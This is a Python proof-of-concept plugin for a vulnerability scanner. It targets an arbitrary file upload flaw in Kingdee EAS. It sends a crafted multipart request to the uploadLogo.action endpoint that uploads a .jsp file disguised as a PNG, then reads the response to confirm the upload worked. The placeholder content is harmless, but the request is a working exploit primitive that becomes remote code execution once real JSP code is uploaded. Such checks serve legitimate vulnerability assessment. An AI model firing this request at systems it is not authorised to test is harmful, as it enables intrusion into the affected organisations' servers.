import requests
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "任意文件上传"
        self.app_name = '金蝶EAS'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        path = "/plt_portal/setting/uploadLogo.action"
        url = target + path
        headers = {
            'Content-Type': 'multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62'
        }
        body = (
            "--04844569c7ca7d21a3ca115dca477d62\r\n"
            "Content-Disposition: form-data; name=\"chooseLanguage_top\"; filename=\"chooseLanguage_top\"\r\n"
            "\r\n"
            "ch\r\n"
            "--04844569c7ca7d21a3ca115dca477d62\r\n"
            "Content-Disposition: form-data; name=\"dataCenter\"; filename=\"dataCenter\"\r\n"
            "\r\n"
            "xx\r\n"
            "--04844569c7ca7d21a3ca115dca477d62\r\n"
            "Content-Disposition: form-data; name=\"insId\"; filename=\"insId\"\r\n"
            "\r\n"
            "\r\n"
            "--04844569c7ca7d21a3ca115dca477d62\r\n"
            "Content-Disposition: form-data; name=\"type\"; filename=\"type\"\r\n"
            "\r\n"
            "top\r\n"
            "--04844569c7ca7d21a3ca115dca477d62\r\n"
            "Content-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\r\n"
            "Content-Type: image/png\r\n"
            "\r\n"
            "test\r\n"
            "--04844569c7ca7d21a3ca115dca477d62--"
        )

        conn = requests.post(url, headers=headers, data=body)
        content = conn.content

        if conn.status_code == 200 and b"jsp" in content and b"nullLogo" in content:
            self.logger.success("发现漏洞, 金蝶EAS任意文件上传: {}".format(url))
            return url
        else:
            self.logger.debug("未发现漏洞")

        return None
